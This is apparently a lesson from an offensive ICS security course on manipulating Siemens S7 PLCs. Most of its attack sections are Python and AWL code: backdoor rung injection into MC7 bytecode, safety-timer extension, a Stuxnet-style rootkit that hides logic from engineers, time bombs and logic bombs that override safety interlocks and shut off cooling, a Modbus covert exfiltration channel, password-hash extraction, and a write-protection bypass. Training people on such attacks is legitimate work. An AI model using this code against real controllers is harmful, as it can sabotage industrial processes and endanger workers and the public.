Lesson 04: PLC Logic Manipulation &
Injection

Lesson 04: PLC Logic Manipulation &
Injection
Learning Objectives
●​
●​
●​
●​
●​

Reverse engineer ladder logic and function block diagrams
Inject malicious rungs into PLC programs
Develop PLC rootkits for persistence
Manipulate timers, counters, and control flow
Bypass PLC security mechanisms (passwords, write protection)

1. PLC Programming Fundamentals
1.1 IEC 61131-3 Programming Languages
Language

Type

Use Case

Attack Surface

Ladder Logic (LD)

Graphical

Relay logic, discrete
control

Function Block
(FBD)

Graphical

Process control, complex Block parameter
algorithms
modification

Structured Text (ST)

Text

Mathematical operations, Code injection
algorithms

Sequential Function
Chart (SFC)

Graphical

State machines, batch
processes

Step manipulation

Instruction List (IL)

Text

Low-level operations

Bytecode injection

1.2 PLC Memory Structure
┌───────────────────────────────────┐
│
PLC Memory Map
│
├───────────────────────────────────┤
│ Program Memory
│
│ ├─ OB (Organization Blocks)
│
│ ├─ FB (Function Blocks)
│
│ ├─ FC (Functions)
│
│ └─ DB (Data Blocks)
│

Rung injection, contact
manipulation

│
│
│ Process Image
│
│ ├─ Inputs (I)
│
│ └─ Outputs (Q)
│
│
│
│ Bit Memory (M)
│
│ └─ Internal flags, markers
│
│
│
│ Timers & Counters
│
│ ├─ T (Timers)
│
│ └─ C (Counters)
│
│
│
│ Data Blocks (DB)
│
│ └─ Persistent data storage
│
└───────────────────────────────────┘

2. Ladder Logic Reverse Engineering
2.1 Decompiling Siemens MC7 Bytecode
MC7 to AWL (Statement List) Conversion:
#!/usr/bin/env python3
"""
Decompile Siemens S7 MC7 bytecode to AWL
MC7 is proprietary bytecode format for S7 PLCs
"""
def decompile_mc7_to_awl(mc7_bytes):
"""
Basic MC7 decompiler
"""
awl_code = []
offset = 0
while offset < len(mc7_bytes):
opcode = mc7_bytes[offset]
# MC7 opcodes (simplified subset)
if opcode == 0x70: # A (AND)
operand_type = mc7_bytes[offset+1]
if operand_type == 0x81: # Input
bit_addr = struct.unpack('>H', mc7_bytes[offset+2:offset+4])[0]
awl_code.append(f"A I{bit_addr >> 3}.{bit_addr & 0x07}")
offset += 4
elif opcode == 0x71: # AN (AND NOT)

operand_type = mc7_bytes[offset+1]
if operand_type == 0x81:
bit_addr = struct.unpack('>H', mc7_bytes[offset+2:offset+4])[0]
awl_code.append(f"AN I{bit_addr >> 3}.{bit_addr & 0x07}")
offset += 4
elif opcode == 0x76: # = (Assignment)
operand_type = mc7_bytes[offset+1]
if operand_type == 0x82: # Output
bit_addr = struct.unpack('>H', mc7_bytes[offset+2:offset+4])[0]
awl_code.append(f"= Q{bit_addr >> 3}.{bit_addr & 0x07}")
offset += 4
elif opcode == 0xBE: # CALL
block_num = struct.unpack('>H', mc7_bytes[offset+1:offset+3])[0]
awl_code.append(f"CALL FB{block_num}")
offset += 3
else:
offset += 1 # Unknown opcode, skip
return '\n'.join(awl_code)
# Example usage:
# mc7_data = open('OB1.mc7', 'rb').read()
# awl = decompile_mc7_to_awl(mc7_data)
# print(awl)

2.2 Analyzing Extracted Logic
Identify Critical Control Logic:
def analyze_plc_logic(awl_code):
"""
Analyze decompiled ladder logic for attack vectors
"""
critical_outputs = []
safety_interlocks = []
timers = []
for line in awl_code.split('\n'):
# Find output assignments (actuators)
if '= Q' in line:
output = line.split('Q')[1].strip()
critical_outputs.append(output)
print(f"[*] Output: Q{output}")
# Find safety interlocks (AND NOT conditions)

if 'AN' in line and ('ESTOP' in line or 'ALARM' in line):
safety_interlocks.append(line)
print(f"[!] Safety interlock: {line}")
# Find timers
if 'T' in line:
timers.append(line)
print(f"\n[*] Found {len(critical_outputs)} outputs")
print(f"[!] Found {len(safety_interlocks)} safety interlocks")
print(f"[*] Found {len(timers)} timers")
return critical_outputs, safety_interlocks, timers

3. Malicious Logic Injection
3.1 Ladder Logic Backdoor Rung
Example: Hidden Remote Control:
Original Logic (Pump Control):
RUNG 1: IF Start_Button AND NOT Stop_Button AND NOT High_Level
THEN Pump_Output = TRUE
Backdoored Logic:
RUNG 1: IF Start_Button AND NOT Stop_Button AND NOT High_Level
THEN Pump_Output = TRUE
RUNG 2 (Injected):
IF M100.0 (hidden marker bit)
THEN Pump_Output = TRUE
Attack:
- Attacker sets M100.0 = TRUE via Modbus or S7comm
- Pump activates regardless of buttons or interlocks
- Rung 2 is hidden deep in program (operators won't notice)
AWL Implementation:
// Legitimate rung
A I0.0
// Start button
AN I0.1
// Stop button
AN I0.2
// High level sensor
= Q0.0
// Pump output
// Backdoor rung (injected)
A M100.0 // Secret trigger bit

=

Q0.0

// Force pump ON

3.2 Automated Rung Injection Script
Inject Backdoor into Compiled PLC Program:
def inject_backdoor_rung(original_mc7, trigger_marker, target_output):
"""
Inject malicious rung into MC7 bytecode
"""
# Build backdoor rung in MC7 format
# A M100.0; = Q0.0
backdoor_mc7 = bytes([
0x70, 0x83, # A (AND)
0x01, 0x90, # M100.0 (marker bit 100.0)
0x76, 0x82, # = (assignment)
0x00, 0x00 # Q0.0 (output 0.0)
])
# Append to end of OB1
modified_mc7 = original_mc7 + backdoor_mc7
print("[+] Backdoor rung injected")
print(f" Trigger: M{trigger_marker}")
print(f" Target: Q{target_output}")
return modified_mc7
# Usage:
# ob1_original = open('OB1.mc7', 'rb').read()
# ob1_backdoored = inject_backdoor_rung(ob1_original, 100, 0)
#
# # Upload to PLC
# plc.download('OB', 1, ob1_backdoored)

3.3 Timer Manipulation Attacks
Extend Safety Timer to Create Hazard Window:
def manipulate_safety_timer(plc_ip):
"""
Modify safety timer to extend dangerous condition window
"""
import snap7
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1)

# Read timer configuration
# Timers stored in special memory area
# Example: T10 is safety shutoff timer (normally 5 seconds)
# Modify to 5 minutes (300 seconds)
# Timer format in S7: Time value in milliseconds (16-bit)
normal_time = 5000 # 5 seconds
malicious_time = 300000 # 5 minutes
# Write to timer preset value (implementation depends on PLC model)
# plc.write_area(area, db_num, start, data)
print(f"[+] Safety timer extended: {normal_time}ms → {malicious_time}ms")
print("[!] Hazard window increased 60x")
plc.disconnect()

4. PLC Rootkit Development
4.1 Firmware-Level Rootkit
Persistent Backdoor in PLC Firmware:
def create_plc_rootkit(firmware_image):
"""
Inject rootkit into PLC firmware
Survives power cycles and program downloads
"""
# Parse firmware image (binary blob)
# Identify bootloader section
# Inject hook in boot sequence
# Hook intercepts program execution on startup
rootkit_code = bytes([
# Assembly code to:
# 1. Check for secret network packet
# 2. If received, execute payload
# 3. Continue normal boot
])
# Insert at firmware offset (requires reverse engineering)
offset = 0x1000 # Example offset
modified_firmware = (
firmware_image[:offset] +

rootkit_code +
firmware_image[offset+len(rootkit_code):]
)
print("[+] Rootkit injected into firmware")
print("[!] Backdoor persists across:")
print(" - Power cycles")
print(" - Program downloads")
print(" - Firmware updates (until overwritten)")
return modified_firmware

4.2 Logic-Level Rootkit (Stuxnet-Style)
Hide Malicious Logic from Engineering Software:
class PLCRootkit:
"""
Implement Stuxnet-style PLC rootkit
Hides malicious logic from Step 7 / TIA Portal
"""
def install_s7_rootkit(self, plc_ip):
"""
Install rootkit in Siemens S7 PLC
"""
import snap7
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1)
# Step 1: Upload legitimate OB1
legitimate_ob1 = plc.upload('OB', 1)
# Step 2: Create backdoored version
backdoored_ob1 = self.inject_backdoor(legitimate_ob1)
# Step 3: Download backdoored version to PLC
plc.download('OB', 1, backdoored_ob1)
# Step 4: Hook S7comm read operations
# When engineering software reads OB1, return clean version
# When PLC executes OB1, run backdoored version
# This requires either:
# - Firmware modification (intercept read commands)
# - Or MITM proxy between engineering station and PLC

print("[+] Rootkit installed")
print("[*] Malicious logic hidden from operators")
plc.disconnect()
def inject_backdoor(self, original_code):
"""
Add malicious rung while preserving original logic
"""
# Append attack logic
backdoor = b'\x70\x83\x01\x90\x76\x82\x00\x00' # A M100.0; = Q0.0
return original_code + backdoor

5. Advanced Attack Patterns
5.1 Time Bomb Logic
Activate on Specific Date/Time:
Ladder Logic (AWL):
// Read system clock
CALL SFC1 // READ_CLK (read PLC clock)
L
#CDT // Load current date/time
// Compare to trigger date (2024-12-31)
L
DT#2024-12-31-23:59:00
==I
// If match, activate attack
JC ATTACK_LABEL
// Normal operation
...
ATTACK_LABEL:
// Malicious logic
AN I0.5 // Ignore safety interlock
S Q0.2 // Activate critical output

5.2 Logic Bomb Based on Process Conditions
Trigger on Specific Sensor Values:
// Monitor temperature sensor
L IW10 // Load input word 10 (temperature)
L 500
// Compare to 500°C
>I
// Greater than?

// If temp > 500, AND pump is running
A Q0.0 // Pump output
// Then disable cooling system
R Q0.1 // Reset cooling valve
// Result: Overheat condition

5.3 Covert Channel via PLC
Exfiltrate Data Through Process Variables:
def plc_covert_channel(plc_ip, data_to_exfiltrate):
"""
Encode data in PLC analog output
Use process variable as covert channel
"""
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient(plc_ip, port=502)
client.connect()
# Encode data in least significant bits of analog output
# Example: Flow rate setpoint normally 1000-2000
for byte in data_to_exfiltrate:
# Encode byte in LSBs of register
base_value = 1500 # Normal flow rate
encoded_value = base_value + byte
# Write to holding register
client.write_register(100, encoded_value, unit=1)
time.sleep(1) # Slow to avoid detection
client.close()
print("[+] Data exfiltrated via covert channel")

6. Bypassing PLC Security
6.1 Password Extraction
S7-1200 Password Recovery:
def extract_s7_password(plc_ip):
"""

Extract password hash from S7-1200/1500 PLC
Password stored in PLC memory
"""
import snap7
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1)
# Read system data block (SDB) containing password
# SDB 2: Password and protection level
try:
sdb_data = plc.read_area(
area=0x05, # System Data Block
db_number=2,
start=0,
size=100
)
# Parse password hash (MD5 or similar)
password_hash = sdb_data[10:26] # Example offset
print(f"[+] Password hash extracted: {password_hash.hex()}")
print("[*] Crack offline with hashcat")
# Save to file for cracking
with open("s7_password_hash.txt", "w") as f:
f.write(password_hash.hex())
except Exception as e:
print(f"[-] Extraction failed: {e}")
plc.disconnect()

6.2 Write Protection Bypass
Force PLC to Programming Mode:
def bypass_write_protection(plc_ip):
"""
Bypass write protection by forcing PLC to STOP mode
"""
import snap7
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1)
# Check current PLC status

status = plc.get_cpu_state()
print(f"[*] Current PLC state: {status}")
if status == 'RUN':
# Stop PLC (disables write protection)
plc.plc_stop()
print("[+] PLC stopped")
# Now download malicious program
# plc.download('OB', 1, backdoored_code)
# Restart PLC
plc.plc_start()
print("[+] PLC restarted with malicious code")
plc.disconnect()

7. Hands-On Lab Exercises
Lab 1: Ladder Logic Reverse Engineering
1.​ Extract OB1 from OpenPLC or S7 simulator
2.​ Decompile MC7 to AWL using provided script
3.​ Analyze logic to identify:
○​ Critical outputs
○​ Safety interlocks
○​ Timers and counters
4.​ Document attack vectors

Lab 2: Malicious Rung Injection
1.​ Create simple ladder logic (pump control with interlock)
2.​ Compile to MC7
3.​ Inject backdoor rung (hidden trigger)
4.​ Upload to PLC
5.​ Test: Activate pump via backdoor without pressing start button

Lab 3: PLC Rootkit Simulation
1.​ Implement logic hiding mechanism
2.​ Create two versions of OB1:
○​ Clean version (for display)
○​ Backdoored version (for execution)
3.​ Use MITM proxy to intercept read requests
4.​ Return clean version to engineering software
5.​ Demonstrate operator cannot see malicious logic

Lab 4: Time Bomb Implementation
1.​ Write ladder logic with date/time trigger
2.​ Use PLC system clock function
3.​ Set trigger for 1 minute in future
4.​ Deploy to PLC
5.​ Observe activation at specified time

8. Tools & Resources
PLC Programming
●​ OpenPLC Editor: Open-source ladder logic IDE
●​ Codesys: IEC 61131-3 programming suite
●​ Siemens TIA Portal: Professional PLC programming (trial available)

Reverse Engineering
●​ mc7disasm: https://github.com/aliqandil/mc7disasm
●​ PLCinject: https://github.com/SCADACS/PLCinject
●​ Ghidra: Reverse engineering platform (can analyze firmware)

PLC Simulation
●​ OpenPLC: https://www.openplcproject.com/
●​ Siemens PLCSIM: S7 PLC simulator

9. Knowledge Check
1.​ What are the five IEC 61131-3 programming languages?
2.​ How do you decompile Siemens MC7 bytecode to AWL?
3.​ Describe the process of injecting a backdoor rung into ladder logic.
4.​ What is the difference between a logic-level rootkit and firmware rootkit?
5.​ How would you implement a time bomb in PLC logic?
6.​ What are covert channels in PLCs, and how can they be used?
7.​ How do you bypass password protection on S7-1200 PLCs?
8.​ Why is write protection important, and how can it be circumvented?
9.​ Describe Stuxnet's method of hiding malicious logic from engineers.
10.​What defensive measures prevent logic injection attacks?

